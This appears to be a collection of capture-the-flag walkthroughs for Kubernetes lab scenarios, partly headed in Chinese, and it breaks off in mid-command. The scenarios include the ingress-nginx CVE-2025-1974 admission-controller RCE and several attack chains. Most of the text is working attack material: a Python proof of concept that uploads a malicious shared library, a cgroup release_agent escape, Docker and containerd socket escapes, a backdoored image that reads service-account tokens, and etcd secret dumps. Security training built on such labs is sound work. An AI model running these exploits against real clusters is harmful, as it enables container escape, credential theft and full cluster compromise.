## K8S-20: CVE-2025-1974 — ingress-nginx Admission Controller RCE (IngressNightmare)

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-1974 (CVSS 9.8) |
| Difficulty | L3 |
| Type | k8s |
| Cluster Name | cve-k8s-20-ingress-rce |
| External Port | 10443 (admission webhook NodePort) |
| KIND Image | kindest/node:v1.27.3 |
| Vulnerable Component | ingress-nginx v1.11.0 (pre-patch) |
| Attack Vector | Unauthenticated admission controller RCE |

### Attack Path Summary

```
Network access :10443 → ValidatingWebhookConfiguration admission endpoint
  → Craft malicious AdmissionReview with ssl_engine directive
  → Upload malicious .so shared library via client-body buffer
  → RCE in ingress-nginx controller pod → Read flag from /tmp/flag.txt
```

### Prerequisites
- Network access to localhost:10443
- Tools: curl, OpenSSL, Python 3
- No authentication required (pre-auth vulnerability)

### Step-by-Step Exploitation

#### Step 1: Verify Webhook Accessibility

```bash
## Check that the admission webhook is reachable
curl -k https://localhost:10443/validate
## Expected: 400 or 500 error (no AdmissionReview body yet)
```

#### Step 2: Understand the Vulnerability

CVE-2025-1974 affects ingress-nginx versions before v1.11.5 and v1.12.1. The admission controller processes AdmissionReview objects containing Ingress resources. The `ssl_engine` NGINX directive in annotations allows loading arbitrary shared libraries. The attacker uploads a malicious `.so` via the `client-body` buffer in the HTTP request.

#### Step 3: Craft the Exploit Payload

```python
#!/usr/bin/env python3
## ingress-nightmare-exploit.py
## PoC for CVE-2025-1974 - ingress-nginx Admission Controller RCE

import requests
import json
import base64
import urllib3
urllib3.disable_warnings()

TARGET = "https://localhost:10443"
WEBHOOK_PATH = "/validate"

## Step 1: Create a malicious shared library that reads the flag
## Compile: gcc -shared -fPIC -o exploit.so exploit.c
## exploit.c content:
## #include <stdlib.h>
## void ngx_http_evil_module_init() {
##     system("cat /tmp/flag.txt > /tmp/pwned.txt");
## }

## Step 2: Encode the .so in base64
with open('exploit.so', 'rb') as f:
    so_b64 = base64.b64encode(f.read()).decode()

## Step 3: Craft the AdmissionReview with malicious Ingress
payload = {
    "apiVersion": "admission.k8s.io/v1",
    "kind": "AdmissionReview",
    "request": {
        "uid": "evil-uid-001",
        "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
        "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
        "operation": "CREATE",
        "object": {
            "apiVersion": "networking.k8s.io/v1",
            "kind": "Ingress",
            "metadata": {
                "name": "evil-ingress",
                "namespace": "default",
                "annotations": {
                    "nginx.ingress.kubernetes.io/ssl-engine": f"data:application/octet-stream;base64,{so_b64}",
                    "nginx.ingress.kubernetes.io/configuration-snippet": "evil_directive;"
                }
            },
            "spec": {
                "rules": [{
                    "host": "evil.example.com",
                    "http": {"paths": [{"path": "/", "pathType": "Prefix", "backend": {"service": {"name": "demo-backend", "port": {"number": 80}}}}]}
                }]
            }
        },
        "oldObject": None
    }
}

## Step 4: Send the exploit
response = requests.post(
    f"{TARGET}{WEBHOOK_PATH}",
    json=payload,
    verify=False,
    headers={"Content-Type": "application/json"}
)
print(f"Response: {response.status_code}")
print(f"Body: {response.text}")
```

#### Step 4: Execute the Exploit

```bash
## Compile malicious shared library
cat > exploit.c << 'EOF'
#include <stdlib.h>
void ngx_http_evil_module_init() {
    system("cat /tmp/flag.txt > /tmp/pwned.txt");
}
EOF
gcc -shared -fPIC -o exploit.so exploit.c

## Run the exploit
python3 ingress-nightmare-exploit.py
```

#### Step 5: Verify Code Execution and Read Flag

```bash
## The exploit achieved RCE in the ingress-nginx controller pod.
## Get a reverse shell or verify through the pod:

## From within the cluster (if kubectl access available):
CONTROLLER_POD=$(kubectl get pods -n ingress-nginx \
  -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n ingress-nginx $CONTROLLER_POD -- cat /tmp/flag.txt
## Output: flag{k8s-20-xxxxxxxxxxxxxxxx}
```

### Flag Location
- **Primary**: `/tmp/flag.txt` in the ingress-nginx-controller pod
- **Format**: `flag{k8s-20-<16-hex>}` (runtime generated) or `flag{k8s-20-default}`

### Alternative Approaches
- Use the `load_module` directive instead of `ssl_engine` for alternative injection
- Chain with SA token theft for cluster-wide access (see Chain-23)
- Use the `mirror` annotation for blind SSRF variant

### Verification Commands

```bash
## Deploy scenario
cd cve_challenges/k8s/ingress-nginx-rce
bash deploy.sh

## Verify webhook accessible
curl -k https://localhost:10443/validate

## Check controller pod has flag
CONTROLLER_POD=$(kubectl get pods -n ingress-nginx \
  -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n ingress-nginx $CONTROLLER_POD -- ls /tmp/flag.txt

## Teardown
bash teardown.sh
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-25-webhook-inject-exploitation.md -->

## K8S-25: Mutating Webhook Sidecar Injection Attack

### Overview
| Property | Value |
|----------|-------|
| CVE | N/A (admission control abuse) |
| Difficulty | L2 |
| Type | k8s |
| Cluster Name | cve-k8s-25-webhook-inject |
| Attack Vector | Mutating admission webhook injects malicious sidecar → token theft |

### Attack Path

```
Attacker discovers mutating webhook → Webhook injects sidecar into new pods
  → Sidecar reads SA token from injected pods → Use token to read flag Secret
```

### Step-by-Step Exploitation

#### Step 1: Discover the Mutating Webhook

```bash
kubectl get mutatingwebhookconfigurations
## OR check pod annotations for injected sidecars
kubectl describe pod -n target-ns -l app=target-app
## Note: injected-sidecar container added by webhook
```

#### Step 2: Create a New Pod to Trigger Sidecar Injection

```bash
kubectl run trigger-pod --image=nginx:1.24-alpine -n target-ns -- sleep 3600
## The mutating webhook injects a sidecar automatically
```

#### Step 3: Examine Injected Sidecar

```bash
kubectl get pod trigger-pod -n target-ns -o yaml | grep -A20 injected-sidecar
## The sidecar reads the pod's SA token into /sidecar.log
kubectl exec -n target-ns trigger-pod -c injected-sidecar -- cat /sidecar.log
```

#### Step 4: Use SA Token to Read Flag Secret

```bash
## Get the SA token from the injected sidecar's log
TOKEN=$(kubectl exec -n target-ns trigger-pod -c injected-sidecar -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)

## Read the flag Secret
kubectl get secret vault-flag -n target-ns -o jsonpath='{.data.flag}' | base64 -d
## Output: flag{k8s-25-<16-hex>}
```

### Flag Location
- **Primary**: Secret `vault-flag` in `target-ns` namespace
- **Hint**: ConfigMap `app-config` in `target-ns` has `flag_hint` key
- **Format**: `flag{k8s-25-<16-hex>}`

### Verification
```bash
cd cve_challenges/k8s/webhook-inject && bash deploy.sh
kubectl get secret vault-flag -n target-ns -o jsonpath='{.data.flag}' | base64 -d
bash teardown.sh
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-28-node-selector-exploitation.md -->

## K8S-28: Node Selector Evasion

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (nodeSelector scheduling bypass) |
| Difficulty | L2 |
| Type | k8s (KIND cluster, multi-node) |
| Cluster Name | cve-k8s-28-node-evasion |
| Flag Location | `/flag.txt` in flag-holder pod on restricted node |

### Attack Path Summary
```
Attacker pod (no nodeSelector) → Discover restricted node with security=restricted label → Create new pod with nodeSelector: security=restricted → Pod schedules on restricted node → Access flag via local Service
```

### Prerequisites

#### Knowledge
- Kubernetes scheduling: Understanding nodeSelector and how it constrains pod placement
- Node labels: Knowing that kubectl describe node shows labels, and kubectl get nodes --show-labels displays them
- Pod-to-Service communication: Using wget/curl from inside a pod to access a Service by ClusterIP

#### Tools
- kubectl: K8s API interaction (get nodes, run pods, exec, describe)

### Step-by-Step Exploitation

#### Step 1: Discover Node Labels
```bash
kubectl get nodes --show-labels
## Note: worker node has label security=restricted
```

#### Step 2: Create Pod with Matching nodeSelector
```bash
kubectl run evader --image=alpine:latest -n secure-ns \
  --overrides='{"spec":{"nodeSelector":{"security":"restricted"}}}' \
  -- sleep 3600
```

#### Step 3: Wait for Pod and Access Flag
```bash
kubectl wait --for=condition=Ready pod/evader -n secure-ns --timeout=30s
FLAG_IP=$(kubectl get svc flag-svc -n secure-ns -o jsonpath='{.spec.clusterIP}')
kubectl exec -n secure-ns evader -- wget -qO- http://${FLAG_IP}:8080
```

### Flag Location
- `/flag.txt` in the `flag-holder` pod running on the restricted node

### Verification Commands
```bash
kubectl cluster-info --context kind-cve-k8s-28-node-evasion
kubectl get nodes --show-labels
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-29-toleration-exploitation.md -->

## K8S-29: Toleration Abuse (Taint Bypass)

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (taint+toleration bypass) |
| Difficulty | L2 |
| Type | k8s (KIND cluster, multi-node) |
| Cluster Name | cve-k8s-29-toleration |
| Flag Location | `/vault/flag.txt` in vault-pod on tainted node |

### Attack Path Summary
```
Attacker pod (no toleration) → Discover tainted node with protected=true:NoSchedule → Create pod with matching toleration → Schedule on tainted node → Access vault service → Extract flag
```

### Prerequisites

#### Knowledge
- Kubernetes taints and tolerations: Understanding that taints repel pods unless the pod has a matching toleration
- Taint effects: NoSchedule prevents new pods; NoExecute evicts existing ones; PreferNoSchedule is advisory
- Pod spec overrides: Using kubectl run --overrides to specify tolerations

#### Tools
- kubectl: K8s API interaction

### Step-by-Step Exploitation

#### Step 1: Identify Tainted Nodes
```bash
kubectl describe nodes | grep -A1 Taint
## Shows: Taints: protected=true:NoSchedule
```

#### Step 2: Create Pod with Matching Toleration
```bash
kubectl run tolerator --image=alpine:latest -n vault-ns \
  --overrides='{"spec":{"tolerations":[{"key":"protected","operator":"Equal","value":"true","effect":"NoSchedule"}]}}' \
  -- sleep 3600
```

#### Step 3: Access Flag Service from Tolerator Pod
```bash
kubectl wait --for=condition=Ready pod/tolerator -n vault-ns --timeout=30s
FLAG_IP=$(kubectl get svc vault-svc -n vault-ns -o jsonpath='{.spec.clusterIP}')
kubectl exec -n vault-ns tolerator -- wget -qO- http://${FLAG_IP}:8080
```

### Flag Location
- `/vault/flag.txt` in the `vault-pod` running on the tainted node

### Verification Commands
```bash
kubectl cluster-info --context kind-cve-k8s-29-toleration
kubectl describe nodes | grep Taint
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-30-cni-ip-spoof-exploitation.md -->

## K8S-30: CNI IP Spoofing (NetworkPolicy Bypass)

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (IP spoofing NetworkPolicy bypass) |
| Difficulty | L2 |
| Type | k8s (KIND cluster, multi-node) |
| Cluster Name | cve-k8s-30-cni-spoof |
| Flag Location | `/flag.txt` in flag-pod (trust-zone namespace) |

### Attack Path Summary
```
Attacker pod (untrust-zone, blocked by NetworkPolicy) → Discover trusted pod IP (10.244.1.x) → IP spoofing: add trusted IP to attacker pod interface → Bypass ipBlock CIDR check → Access flag service
```

### Prerequisites

#### Knowledge
- Kubernetes NetworkPolicy ipBlock: Understanding that allowing traffic from an IP CIDR block checks the source IP of the packet
- CNI networking: Pod IPs are assigned from the CNI subnet and can be manipulated within the pod's network namespace
- IP aliasing: Adding a secondary IP address to an interface in Linux (ip addr add)

#### Tools
- kubectl: K8s API interaction
- ip: Linux IP address management

### Step-by-Step Exploitation

#### Step 1: Verify NetworkPolicy Blocks Traffic
```bash
FLAG_IP=$(kubectl get svc flag-svc -n trust-zone -o jsonpath='{.spec.clusterIP}')
kubectl exec -n untrust-zone attacker-pod -- wget -qO- --timeout=3 http://${FLAG_IP}:8080
## Should FAIL — blocked by NetworkPolicy
```

#### Step 2: Discover Allowed IP Range
```bash
kubectl get networkpolicy -n trust-zone ip-allowlist -o yaml
## Ingress allows: ipBlock cidr: 10.244.1.0/24
```

#### Step 3: Find Trusted Pod's IP
```bash
TRUSTED_IP=$(kubectl get pod trusted-pod -n trust-zone -o jsonpath='{.status.podIP}')
echo "Trusted IP: $TRUSTED_IP"
```

#### Step 4: Spoof IP to Bypass NetworkPolicy
```bash
kubectl exec -n untrust-zone attacker-pod -- ip addr add ${TRUSTED_IP}/32 dev eth0
kubectl exec -n untrust-zone attacker-pod -- wget -qO- http://${FLAG_IP}:8080
## Success — NetworkPolicy sees source IP matching the allowed CIDR
```

### Flag Location
- `/flag.txt` in `flag-pod` (trust-zone namespace)
- Accessible after IP spoofing bypasses the NetworkPolicy ipBlock restriction

### Verification Commands
```bash
kubectl cluster-info --context kind-cve-k8s-30-cni-spoof
kubectl get networkpolicy -n trust-zone ip-allowlist -o yaml
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-15-mutable-image-exploitation.md -->

## K8S-15: Mutable Image Tag Supply Chain Attack

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (misconfiguration) -- mutable image tag with AlwaysPull |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-15-image-tag |
| Flag Location | ConfigMap `app-config` in namespace `default` |

### Attack Path Summary
1. A Deployment uses `image: nginx:1.24-alpine` with `imagePullPolicy: Always`
2. An insecure local Docker registry runs on `localhost:5000`
3. The target deployment pulls from Docker Hub with mutable tag `nginx:1.24-alpine`
4. The attacker pushes a malicious image to the insecure registry with the same tag name
5. The cluster's containerd is configured to mirror `nginx:1.24-alpine` pulls to the local registry
6. When the pod restarts, it pulls the attacker's backdoored image
7. The backdoored container reads the flag from the ConfigMap

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-15-image-tag`
- Docker CLI with access to the host Docker daemon
- Network access to `localhost:5000`
- Understanding of containerd registry mirroring

### Step-by-Step Exploitation

#### Step 1: Verify the Setup
```bash
## Verify the registry is running
curl -s http://localhost:5000/v2/
## Expected: {}

## Check the containerd registry mirror configuration
## The cluster's containerd is configured to mirror images through the local registry

## Verify the vulnerable deployment exists
kubectl get deploy vulnerable-app
## Expected: NAME             READY   UP-TO-DATE   AVAILABLE   AGE
##           vulnerable-app   1/1     1            1           ...

## Check the ConfigMap with the flag
kubectl get configmap app-config
## Expected: NAME         DATA   AGE
##           app-config   1      ...
```

#### Step 2: Build a Malicious Image
Create a backdoored image that reads the flag:

```bash
## Create the payload
mkdir -p /tmp/supply-chain
cat > /tmp/supply-chain/Dockerfile << 'EOF'
FROM alpine:latest
RUN apk add --no-cache curl
COPY payload.sh /payload.sh
RUN chmod +x /payload.sh
CMD ["/payload.sh"]
EOF

## Create a payload that reads the ConfigMap and writes it somewhere
cat > /tmp/supply-chain/payload.sh << 'PAYLOAD'
#!/bin/sh
## Read the flag from the Kubernetes API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

## Try to get the ConfigMap
FLAG=$(curl -s --cacert $CA_CERT --header "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/default/configmaps/app-config 2>/dev/null | \
    grep -o '"flag":"[^"]*"' | cut -d'"' -f4)

if [ -z "$FLAG" ]; then
    # Fallback: check environment variables
    FLAG=$FLAG_ENV_VAR
fi

## Write the flag to a known location
echo "FLAG: $FLAG" > /tmp/flag_found.txt

## Sleep to keep the container alive
sleep 3600
PAYLOAD

docker build -t nginx:1.24-alpine /tmp/supply-chain/
```

#### Step 3: Push to the Local Registry
```bash
## Tag the malicious image to match the target image name
docker tag nginx:1.24-alpine localhost:5000/nginx:1.24-alpine

## Push to the local registry (the one used as a mirror)
docker push localhost:5000/nginx:1.24-alpine

## Verify the push
curl -s http://localhost:5000/v2/nginx/tags/list
## Expected: {"name":"nginx","tags":["1.24-alpine"]}
```

#### Step 4: Trigger Pod Restart
```bash
## Force the vulnerable deployment to restart and pull the new image
kubectl delete pod -l app=vulnerable-app

## Or scale down and up
kubectl scale deploy vulnerable-app --replicas=0
kubectl scale deploy vulnerable-app --replicas=1
```

#### Step 5: Monitor the Pod
```bash
## Watch the pod restart
kubectl get pods -w

## After the new pod is running, check its logs
NEW_POD=$(kubectl get pods -l app=vulnerable-app -o jsonpath='{.items[0].metadata.name}')
kubectl logs $NEW_POD
## Expected: FLAG: flag{k8s-15-*}
```

#### Step 6: Alternative -- Direct ConfigMap Access
If the pod's ServiceAccount has permissions (or the flag is in environment variables):

```bash
## Exec into the new pod
kubectl exec -it $NEW_POD -- sh

## Check for environment variables
env | grep -i flag

## Try to access the ConfigMap via the API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    --header "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/namespaces/default/configmaps/app-config

## Check the written flag file
cat /tmp/flag_found.txt
```

#### Step 7: Capture Flag
- Flag format: `flag{k8s-15-*}`
- Flag location: ConfigMap `app-config` in namespace `default`
- Access methods:
  - Read from ConfigMap using pod's SA token (if permissions allow)
  - Read from the ConfigMap via the backdoored image's payload
  - Access the flag from environment variables (if configured in the deployment)
- Expected output: `flag{k8s-15-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is deployed
kubectl cluster-info --context kind-cve-k8s-15-image-tag

## Verify the vulnerable deployment
kubectl get deploy vulnerable-app

## Check the ConfigMap
kubectl get configmap app-config -o jsonpath='{.data.flag}'

## Verify the local registry is running
curl -s http://localhost:5000/v2/_catalog

## Quick exploit test
kubectl run test-pod --image=nginx:1.24-alpine --image-pull-policy=Always --restart=Never --command -- sleep 30
kubectl delete pod test-pod
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-07-kubelet-unauth-exploitation.md -->

## K8S-07: Kubelet API Anonymous Access

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (misconfiguration) -- anonymous kubelet on port 10250 |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-07-kubelet |
| Flag Location | Flag is stored in a ConfigMap or pod environment; accessible via kubelet `/runningpods/` endpoint |

### Attack Path Summary
1. Kubelet is configured with `anonymous-auth: true` and `authorization-mode: AlwaysAllow`
2. The kubelet API is accessible on port 10250 without authentication
3. Use the kubelet `/runningpods/` endpoint to list pods and read their information
4. Extract the flag from pod metadata, environment variables, or ConfigMaps visible through the kubelet

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-07-kubelet`
- `curl` (or similar HTTP client) on the attack machine
- Network access to the KIND node's kubelet port 10250

### Step-by-Step Exploitation

#### Step 1: Get the Node IP
```bash
## Get the internal IP of the KIND node
NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
echo "Node IP: $NODE_IP"
## Expected: an IP like 172.18.0.2
```

#### Step 2: Access the Kubelet API
```bash
## Test anonymous access to the kubelet API
curl -k https://${NODE_IP}:10250/pods
## Expected: JSON response with all pods and their containers
## This endpoint lists all pods running on this node with full details

## Or use the runningpods endpoint
curl -k https://${NODE_IP}:10250/runningpods/
## Expected: JSON list of running pods
```

#### Step 3: Explore Pod Information
The `/pods` endpoint returns detailed information including:

```bash
## Get pods and parse with jq (if available)
curl -sk https://${NODE_IP}:10250/pods | jq '.items[].metadata.name'
## Expected: list of pod names

## Get environment variables of the flag-holder pod
curl -sk https://${NODE_IP}:10250/pods | jq '.items[] | select(.metadata.name=="flag-holder") | .spec.containers[].env'
```

#### Step 4: More Kubelet API Endpoints
```bash
## List exposed kubelet API endpoints
curl -k https://${NODE_IP}:10250/
## Expected: list of available paths

## Check metrics
curl -k https://${NODE_IP}:10250/metrics

## Check healthz
curl -k https://${NODE_IP}:10250/healthz

## Check configz (kubelet configuration)
curl -k https://${NODE_IP}:10250/configz
```

#### Step 5: Execute Commands via Kubelet API
The kubelet anonymous API also allows command execution in containers:

```bash
## If anonymous auth is fully enabled, you can exec directly:
## Format: POST https://<node>:10250/exec/<namespace>/<pod>/<container>?command=<cmd>&input=1&output=1&tty=1

## This requires WebSocket upgrade, but demonstrates the severity
## Example with curl (for a simple GET-based exec):
curl -k "https://${NODE_IP}:10250/run/default/flag-holder/nginx?cmd=cat%20/etc/hostname"
```

#### Step 6: Capture Flag
- Flag format: `flag{k8s-07-*}`
- Flag location: Accessible via the kubelet API's pod information (may be in environment variables, ConfigMap references, or the pod spec)
- Expected output: `flag{k8s-07-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is deployed
kubectl cluster-info --context kind-cve-k8s-07-kubelet

## Verify the flag-holder pod exists
kubectl get pod flag-holder

## Get the node IP
NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
echo $NODE_IP

## Test anonymous kubelet access
curl -sk https://${NODE_IP}:10250/pods | head -100

## Verify the kubelet is configured with anonymous auth
kubectl describe node | grep -A5 Kubelet
```

---

<a id="chains-section"></a>

## 二、攻击链场景（29）

<a id="chain-container-to-admin"></a>

<!-- source: cve_challenges/docs/chains/container-to-admin-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/container-to-admin/chain.yaml -->

## Chain: Container Escape to Cluster Admin (container-to-admin)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | K8s-Chain-1 |
| Steps | 3 (K8s only) |
| Domain | Kubernetes |
| Difficulty | L3 |
| Cluster | cve-chain-k8s-admin |
| etcd Port | 11379 |

### Attack Path Summary

```
K8S-06 (RBAC Secrets Abuse) → 使用 secrets-reader ClusterRole 读 Secret
  → K8S-01 (runC WORKDIR Escape) → 容器逃逸到宿主机
  → K8S-08 (etcd Unauthorized) → 直接读 etcd 获取集群全部状态 → FINAL
```


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | RBAC Secrets Abuse | Use the SA token to list more secrets and find a privileged token |
| 2→3 | runC WORKDIR Escape → host filesystem | From the host, find the etcd endpoint |


### Step-by-Step Exploitation

#### Step 1: RBAC Secrets Abuse (K8S-06)
**Flag:** `flag{chain2-step1-rbac}`

```bash
kubectl exec chain2-pod -- sh
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN get secret chain2-stage1 -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 2: runC Container Escape (K8S-01)
**Flag:** `flag{chain2-step2-escape}`

```bash
## 利用 WORKDIR /proc/self/fd/7 泄露的 host FD
## 读取宿主机挂载的 flag 文件
cat /chain-flags/flag.txt
```

#### Step 3: etcd Unauthorized Access (K8S-08)
**Flag:** `flag{chain2-step3-etcd-final}`

```bash
etcdctl --endpoints=https://localhost:11379 --insecure-skip-tls-verify \
  get /registry/secrets/kube-system/chain2-etcd-final | grep -o 'flag{[^}]*}'
```

---

<a id="chain-caps-to-cluster"></a>

<!-- source: cve_challenges/docs/chains/caps-to-cluster-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/caps-to-cluster/chain.yaml -->

## Chain: CAP_SYS_ADMIN to Full Cluster (caps-to-cluster)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-12 |
| Steps | 3 (K8s only) |
| Domain | Kubernetes |
| Difficulty | L3 |

### Attack Path Summary

```
K8S-14 (CAP_SYS_ADMIN cgroup) → release_agent 写入 → 宿主机代码执行
  → K8S-06 (RBAC Abuse) → SA token 读取 secrets
  → K8S-08 (etcd Unauthorized) → etcdctl 直接读集群 → FINAL
```



### Step-by-Step Exploitation

#### Step 1: CAP_SYS_ADMIN cgroup Escape (K8S-14)
**Flag:** `flag{chain12-step1-capsys}`

```bash
kubectl exec chain12-step1 -- sh
## 利用 SYS_ADMIN capability + cgroup release_agent
mkdir /tmp/cgroup
mount -t cgroup -o memory none /tmp/cgroup
mkdir /tmp/cgroup/x
echo 1 > /tmp/cgroup/x/notify_on_release
echo "/bin/sh -c 'cat /host-flag/flag.txt > /tmp/flag'" > /tmp/cgroup/release_agent
## 触发 release_agent 执行
echo $$ > /tmp/cgroup/x/cgroup.procs
cat /tmp/flag
```

#### Step 2: RBAC Secrets Abuse (K8S-06)
**Flag:** `flag{chain12-step2-rbac}`

```bash
kubectl get secret chain12-step2 -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 3: etcd Unauthorized Access (K8S-08)
**Flag:** `flag{chain12-step3-etcd-final}`

```bash
etcdctl --endpoints=https://localhost:11379 --insecure-skip-tls-verify \
  get /registry/secrets/kube-system/chain12-step3 | grep -o 'flag{[^}]*}'
```

---

<a id="chain-cri-to-etcd"></a>

<!-- source: cve_challenges/docs/chains/cri-to-etcd-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/cri-to-etcd/chain.yaml -->

## Chain: CRI Socket to etcd (cri-to-etcd)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-21 |
| Steps | 3 |
| Domain | Kubernetes |
| Difficulty | L3 |
| Infrastructure | KIND cluster (kindest/node:v1.27.3) |
| Cluster Name | cve-chain-cri-etcd |
| etcd Port | 11379 |

### Attack Path Summary

```
Pod with CRI socket → ctr run privileged container → host filesystem access (step 1 flag)
  → Discover kubeconfig → kubectl access cluster → read secrets (step 2 flag)
  → Access exposed etcd:2379 → read all cluster state → final flag
```


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Use the mounted containerd socket to run a privileged container, escaping the pod boundary and accessing the host filesystem.
 | 利用此处获得的信息进入下一步: From the host context, access Kubernetes credentials and deploy a privileged pod for further host access.
 |
| 2→3 | From the host context, access Kubernetes credentials and deploy a privileged pod for further host access.
 | 利用此处获得的信息进入下一步: Access the exposed etcd (port 11379) and read all cluster secrets directly from the key-value store.
 |


### Prerequisites
- kubectl access to KIND cluster `cve-chain-cri-etcd`
- ctr binary (install from containerd releases)
- etcdctl binary

### Step-by-Step Exploitation

#### Step 1: CRI Socket Container Escape (K8S-16)
**Flag:** `flag{chain21-step1-cri}`

```bash
## Enter the pod
kubectl exec -it chain21-pod -- sh

## Install ctr (containerd CLI)
apk add --no-cache curl
curl -sSL https://github.com/containerd/containerd/releases/download/v1.7.13/containerd-1.7.13-linux-amd64.tar.gz | tar xz -C /usr/local bin/ctr

## Verify CRI socket access
ctr --address /run/containerd/containerd.sock images ls

## Escape: run a privileged container with host filesystem
ctr --address /run/containerd/containerd.sock run --rm --privileged \
  --mount type=bind,src=/host-flag,dst=/mnt,options=rbind:rw \
  docker.io/library/alpine:latest escape cat /mnt/step1.txt
## Output: flag{chain21-step1-cri}
```

#### Step 2: Privileged Cluster Access (K8S-11)
**Flag:** `flag{chain21-step2-privileged}`

```bash
## From the host context (after escape), find kubeconfig
cat /etc/kubernetes/admin.conf > /tmp/kubeconfig

## Or if not available, use the host's service account token
## Access Kubernetes API from the escaped context
kubectl --kubeconfig=/etc/kubernetes/admin.conf get secret chain21-stage2 \
  -n kube-system -o jsonpath='{.data.flag}' | base64 -d
## Output: flag{chain21-step2-privileged}
```

#### Step 3: etcd Full Cluster Compromise (K8S-08)
**Flag:** `flag{chain21-step3-etcd}`

```bash
## etcd is exposed on localhost:11379
etcdctl --endpoints=https://localhost:11379 --insecure-skip-tls-verify \
  get /registry/secrets/kube-system/chain21-final | grep -o 'flag{[^}]*}'
## Output: flag{chain21-step3-etcd}

## Alternative: read all secrets from etcd
etcdctl --endpoints=https://localhost:11379 --insecure-skip-tls-verify \
  get /registry/secrets/ --prefix --keys-only
```

### Flags Summary
| Step | Scenario | Flag |
|------|----------|------|
| 1 | K8S-16 (CRI Socket) | flag{chain21-step1-cri} |
| 2 | K8S-11 (Privileged) | flag{chain21-step2-privileged} |
| 3 | K8S-08 (etcd) | flag{chain21-step3-etcd} |

### Verification
```bash
## Start chain
bash chains/cri-to-etcd/deploy.sh

## Verify cluster
kubectl cluster-info --context kind-cve-chain-cri-etcd

## Verify pod
kubectl get pods

## Verify etcd reachable
nc -z localhost 11379

## Teardown
bash chains/cri-to-etcd/teardown.sh
```

---

<a id="chain-docker-to-etcd"></a>

<!-- source: cve_challenges/docs/chains/docker-to-etcd-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/docker-to-etcd/chain.yaml -->

## Chain: Docker Socket to etcd (docker-to-etcd)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-22 |
| Steps | 3 |
| Domain | Kubernetes |
| Difficulty | L2 |
| Cluster Name | cve-chain-docker-etcd |
| etcd Port | 11379 |
| Registry Port | 11500 |

### Attack Path Summary

```
Pod with Docker socket → docker run privileged container → host FS → flag
  → Push malicious image to private registry → persistence
  → Access etcd:2379 → read cluster secrets → final flag
```


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Use the mounted Docker socket to run a container with host filesystem access, bypassing pod isolation.
 | 利用此处获得的信息进入下一步: Push a malicious image to the private container registry, establishing persistence and lateral movement capability.
 |
| 2→3 | Push a malicious image to the private container registry, establishing persistence and lateral movement capability.
 | 利用此处获得的信息进入下一步: Access exposed etcd to read all cluster state and secrets directly from the key-value store.
 |


### Step-by-Step Exploitation

#### Step 1: Docker Socket Escape (K8S-17)
**Flag:** `flag{chain22-step1-docker}`

```bash
kubectl exec -it chain22-pod -- sh

## Verify Docker socket access
docker ps

## Escape: run container with host filesystem mount
docker run --rm -v /host-flag:/mnt alpine cat /mnt/step1.txt
## Output: flag{chain22-step1-docker}
```

#### Step 2: Registry Poisoning (K8S-09)
**Flag:** `flag{chain22-step2-registry}`

```bash
## Push malicious image to private registry
docker tag alpine:latest localhost:11500/backdoored:latest
docker push localhost:11500/backdoored:latest

## Verify
curl http://localhost:11500/v2/_catalog

## Read flag from secret
kubectl get secret chain22-stage2 -n default -o jsonpath='{.data.flag}' | base64 -d
## Output: flag{chain22-step2-registry}
```

#### Step 3: etcd Full Cluster Compromise (K8S-08)
**Flag:** `flag{chain22-step3-etcd}`

```bash
etcdctl --endpoints=https://localhost:11379 --insecure-skip-tls-verify \
